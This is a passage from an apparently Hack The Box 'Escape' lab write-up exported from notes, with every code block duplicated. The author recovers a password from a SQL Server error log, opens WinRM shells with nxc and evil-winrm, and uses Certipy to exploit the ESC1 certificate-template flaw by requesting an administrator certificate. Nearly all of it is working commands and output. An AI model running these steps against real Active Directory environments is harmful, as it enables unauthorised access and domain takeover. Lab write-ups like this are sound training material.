+&boxur;&boxh;$ nxc smb 10.129.228.253 -u sql_svc -p REGGIE1234ronnie
+SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.228.253  445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
+                                                                                                                                                                                                                                  
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ nxc winrm 10.129.228.253 -u sql_svc -p REGGIE1234ronnie
+WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb) 
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.228.253  5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ nxc smb 10.129.228.253 -u sql_svc -p REGGIE1234ronnie
+SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.228.253  445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
+                                                                                                                                                                                                                                  
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ nxc winrm 10.129.228.253 -u sql_svc -p REGGIE1234ronnie
+WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb) 
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.228.253  5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)</code></pre></div>
+<p>Now I have a shell on the machine:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ evil-winrm -i 10.129.228.253 -u sql_svc -p &apos;REGGIE1234ronnie&apos; 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; whoami
+sequel\sql_svc
+*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::ec1e:a44f:6d0d:6100
+   Link-local IPv6 Address . . . . . : fe80::ec1e:a44f:6d0d:6100%4
+   IPv4 Address. . . . . . . . . . . : 10.129.228.253
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:f8df%4
+                                       10.129.0.1
+*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; 
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ evil-winrm -i 10.129.228.253 -u sql_svc -p &apos;REGGIE1234ronnie&apos; 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; whoami
+sequel\sql_svc
+*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::ec1e:a44f:6d0d:6100
+   Link-local IPv6 Address . . . . . : fe80::ec1e:a44f:6d0d:6100%4
+   IPv4 Address. . . . . . . . . . . : 10.129.228.253
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:f8df%4
+                                       10.129.0.1
+*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; 
+</code></pre></div>
+<p>Over at <code class="inline-code">C:\SQLServer\Logs</code>, I notice the file <code class="inline-code">ERRORLOG.BAK</code>. Then I downloaded the file on my machine:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">*Evil-WinRM* PS C:\SQLServer&gt; cd Logs
+*Evil-WinRM* PS C:\SQLServer\Logs&gt; dir
+
+
+    Directory: C:\SQLServer\Logs
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
+
+
+*Evil-WinRM* PS C:\SQLServer\Logs&gt; upload ERRORLOG.BAK
+                                        
+Error: Upload failed. Check filenames or paths: Source file does not exist: /home/kali/Desktop/Labs/Escape/ERRORLOG.BAK
+*Evil-WinRM* PS C:\SQLServer\Logs&gt; download ERRORLOG.BAK
+                                        
+Info: Downloading C:\SQLServer\Logs\ERRORLOG.BAK to ERRORLOG.BAK
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\SQLServer\Logs&gt; 
+</pre><pre class="hljs"><code>*Evil-WinRM* PS C:\SQLServer&gt; cd Logs
+*Evil-WinRM* PS C:\SQLServer\Logs&gt; dir
+
+
+    Directory: C:\SQLServer\Logs
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
+
+
+*Evil-WinRM* PS C:\SQLServer\Logs&gt; upload ERRORLOG.BAK
+                                        
+<span class="hljs-keyword">Error: </span>Upload failed. Check filenames or paths: Source file does not exist: /home/kali/Desktop/Labs/Escape/ERRORLOG.BAK
+*Evil-WinRM* PS C:\SQLServer\Logs&gt; download ERRORLOG.BAK
+                                        
+Info: Downloading C:\SQLServer\Logs\ERRORLOG.BAK to ERRORLOG.BAK
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\SQLServer\Logs&gt; 
+</code></pre></div>
+<p>When looking through the log file, I notice the unusual string <code class="inline-code">NuclearMosquito3</code>. This could be entered accidentally by the user <code class="inline-code">ryan.cooper</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">2022-11-18 13:43:07.44 spid51      Changed database context to &apos;master&apos;.
+2022-11-18 13:43:07.44 spid51      Changed language setting to us_english.
+2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
+2022-11-18 13:43:07.44 Logon       Logon failed for user &apos;sequel.htb\Ryan.Cooper&apos;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
+2022-11-18 13:43:07.48 Logon       Logon failed for user &apos;NuclearMosquito3&apos;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+2022-11-18 13:43:07.72 spid51      Attempting to load library &apos;xpstar.dll&apos; into memory. This is an informational message only. No user action is required.
+2022-11-18 13:43:07.76 spid51      Using &apos;xpstar.dll&apos; version &apos;2019.150.2000&apos; to execute extended stored procedure &apos;xp_sqlagent_is_starting&apos;. This is an informational message only; no user action is required.
+2022-11-18 13:43:08.24 spid51      Changed database context to &apos;master&apos;.
+2022-11-18 13:43:08.24 spid51      Changed language setting to us_english.
+2022-11-18 13:43:09.29 spid9s      SQL Server is terminating in response to a &apos;stop&apos; request from Service Control Manager. This is an informational message only. No user action is required.
+2022-11-18 13:43:09.31 spid9s      .NET Framework runtime has been stopped.
+2022-11-18 13:43:09.43 spid9s      SQL Trace was stopped due to server shutdown. Trace ID = &apos;1&apos;. This is an informational message only; no user action is required.</pre><pre class="hljs"><code>2022-11-18 13:43:07.44 spid51      Changed database context to &apos;master&apos;.
+2022-11-18 13:43:07.44 spid51      Changed language setting to us_english.
+2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
+2022-11-18 13:43:07.44 Logon       Logon failed for user &apos;sequel.htb\Ryan.Cooper&apos;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
+2022-11-18 13:43:07.48 Logon       Logon failed for user &apos;NuclearMosquito3&apos;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+2022-11-18 13:43:07.72 spid51      Attempting to load library &apos;xpstar.dll&apos; into memory. This is an informational message only. No user action is required.
+2022-11-18 13:43:07.76 spid51      Using &apos;xpstar.dll&apos; version &apos;2019.150.2000&apos; to execute extended stored procedure &apos;xp_sqlagent_is_starting&apos;. This is an informational message only; no user action is required.
+2022-11-18 13:43:08.24 spid51      Changed database context to &apos;master&apos;.
+2022-11-18 13:43:08.24 spid51      Changed language setting to us_english.
+2022-11-18 13:43:09.29 spid9s      SQL Server is terminating in response to a &apos;stop&apos; request from Service Control Manager. This is an informational message only. No user action is required.
+2022-11-18 13:43:09.31 spid9s      .NET Framework runtime has been stopped.
+2022-11-18 13:43:09.43 spid9s      SQL Trace was stopped due to server shutdown. Trace ID = &apos;1&apos;. This is an informational message only; no user action is required.</code></pre></div>
+<p>And the credentials seems to work successfully and <code class="inline-code">ryan.cooper</code> has WinRM privileges:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ nxc smb 10.129.228.253 -u &apos;ryan.cooper&apos; -p &apos;NuclearMosquito3&apos;                  
+SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.228.253  445    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 
+                                                                                                                                                                                                                           
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ nxc winrm 10.129.228.253 -u &apos;ryan.cooper&apos; -p &apos;NuclearMosquito3&apos; 
+WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb) 
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.228.253  5985   DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 (Pwn3d!)</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ nxc smb 10.129.228.253 -u &apos;ryan.cooper&apos; -p &apos;NuclearMosquito3&apos;                  
+SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.228.253  445    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 
+                                                                                                                                                                                                                           
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ nxc winrm 10.129.228.253 -u &apos;ryan.cooper&apos; -p &apos;NuclearMosquito3&apos; 
+WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb) 
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.228.253  5985   DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 (Pwn3d!)</code></pre></div>
+<p>Now I have a second shell as the user <code class="inline-code">ryan.cooper</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ evil-winrm -i 10.129.228.253 -u &apos;ryan.cooper&apos; -p &apos;NuclearMosquito3&apos; 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents&gt; whoami
+sequel\ryan.cooper
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::ec1e:a44f:6d0d:6100
+   Link-local IPv6 Address . . . . . : fe80::ec1e:a44f:6d0d:6100%4
+   IPv4 Address. . . . . . . . . . . : 10.129.228.253
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:f8df%4
+                                       10.129.0.1
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents&gt; 
+
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ evil-winrm -i 10.129.228.253 -u &apos;ryan.cooper&apos; -p &apos;NuclearMosquito3&apos; 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents&gt; whoami
+sequel\ryan.cooper
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::ec1e:a44f:6d0d:6100
+   Link-local IPv6 Address . . . . . : fe80::ec1e:a44f:6d0d:6100%4
+   IPv4 Address. . . . . . . . . . . : 10.129.228.253
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:f8df%4
+                                       10.129.0.1
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents&gt; 
+
+</code></pre></div>
+<p>I notice the user <code class="inline-code">ryan.cooper</code> belongs to the <code class="inline-code">Certificate Service DCOM Access</code> group. This enables the user to access the AD certificates:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">*Evil-WinRM* PS C:\Temp&gt; whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID          Attributes
+=========================================== ================ ============ ==================================================
+Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+*Evil-WinRM* PS C:\Temp&gt; </pre><pre class="hljs"><code>*Evil-WinRM* PS C:\Temp&gt; whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID          Attributes
+=========================================== ================ ============ ==================================================
+Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+*Evil-WinRM* PS C:\Temp&gt; </code></pre></div>
+<p>When checking what AD CS vulnerabilities exist, the <code class="inline-code">ESC1</code> pops out:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ certipy-ad find -u ryan.cooper -p &apos;NuclearMosquito3&apos; -dc-ip 10.129.228.253 -target-ip 10.129.228.253 -vulnerable -enable -stdout
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 15 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for &apos;sequel-DC-CA&apos; via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for &apos;sequel-DC-CA&apos;
+[*] Checking web enrollment for CA &apos;sequel-DC-CA&apos; @ &apos;dc.sequel.htb&apos;
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : sequel-DC-CA
+    DNS Name                            : dc.sequel.htb
+    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
+    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
+    Certificate Validity End            : 2121-11-18 21:08:46+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : SEQUEL.HTB\Administrators
+      Access Rights
+        ManageCa                        : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        ManageCertificates              : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Enroll                          : SEQUEL.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : UserAuthentication
+    Display Name                        : UserAuthentication
+    Certificate Authorities             : sequel-DC-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Client Authentication
+                                          Secure Email
+                                          Encrypting File System
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 10 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2022-11-18T21:10:22+00:00
+    Template Last Modified              : 2024-01-19T00:26:38+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Domain Users
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Administrator
+        Full Control Principals         : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Write Property Enroll           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Domain Users
+                                          SEQUEL.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ certipy-ad find -u ryan.cooper -p &apos;NuclearMosquito3&apos; -dc-ip 10.129.228.253 -target-ip 10.129.228.253 -vulnerable -enable -stdout
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 15 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for &apos;sequel-DC-CA&apos; via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for &apos;sequel-DC-CA&apos;
+[*] Checking web enrollment for CA &apos;sequel-DC-CA&apos; @ &apos;dc.sequel.htb&apos;
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : sequel-DC-CA
+    DNS Name                            : dc.sequel.htb
+    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
+    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
+    Certificate Validity End            : 2121-11-18 21:08:46+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : SEQUEL.HTB\Administrators
+      Access Rights
+        ManageCa                        : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        ManageCertificates              : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Enroll                          : SEQUEL.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : UserAuthentication
+    Display Name                        : UserAuthentication
+    Certificate Authorities             : sequel-DC-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Client Authentication
+                                          Secure Email
+                                          Encrypting File System
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 10 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2022-11-18T21:10:22+00:00
+    Template Last Modified              : 2024-01-19T00:26:38+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Domain Users
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Administrator
+        Full Control Principals         : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Write Property Enroll           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Domain Users
+                                          SEQUEL.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.</code></pre></div>
+<p>Use this amazing blog from <a data-from-md="" title="https://www.hackingarticles.in/ad-certificate-exploitation-esc1/" href="https://www.hackingarticles.in/ad-certificate-exploitation-esc1/">HackingArticles</a> to perform privilege escalation.</p>
+<p>Firstly request a certificate as administrator:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ certipy-ad req -u &apos;ryan.cooper@sequel.htb&apos; -p &apos;NuclearMosquito3&apos; -dc-ip 10.129.228.253 -ca sequel-DC-CA -target &apos;dc.sequel.htb&apos; -template &apos;UserAuthentication&apos; -upn &apos;administrator@sequel.htb&apos;
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 15
+[*] Successfully requested certificate
+[*] Got certificate with UPN &apos;administrator@sequel.htb&apos;
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to &apos;administrator.pfx&apos;
+[*] Wrote certificate and private key to &apos;administrator.pfx&apos;
+
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ certipy-ad req -u &apos;ryan.cooper@sequel.htb&apos; -p &apos;NuclearMosquito3&apos; -dc-ip 10.129.228.253 -ca sequel-DC-CA -target &apos;dc.sequel.htb&apos; -template &apos;UserAuthentication&apos; -upn &apos;administrator@sequel.htb&apos;  
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 16
+[*] Successfully requested certificate
+[*] Got certificate with UPN &apos;administrator@sequel.htb&apos;
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to &apos;administrator.pfx&apos;
+File &apos;administrator.pfx&apos; already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote certificate and private key to &apos;administrator.pfx&apos;
+
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ certipy-ad req -u &apos;ryan.cooper@sequel.htb&apos; -p &apos;NuclearMosquito3&apos; -dc-ip 10.129.228.253 -ca sequel-DC-CA -target &apos;dc.sequel.htb&apos; -template &apos;UserAuthentication&apos; -upn &apos;administrator@sequel.htb&apos;
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 15
+[*] Successfully requested certificate
+[*] Got certificate with UPN &apos;administrator@sequel.htb&apos;
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to &apos;administrator.pfx&apos;
+[*] Wrote certificate and private key to &apos;administrator.pfx&apos;
+
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ certipy-ad req -u &apos;ryan.cooper@sequel.htb&apos; -p &apos;NuclearMosquito3&apos; -dc-ip 10.129.228.253 -ca sequel-DC-CA -target &apos;dc.sequel.htb&apos; -template &apos;UserAuthentication&apos; -upn &apos;administrator@sequel.htb&apos;  
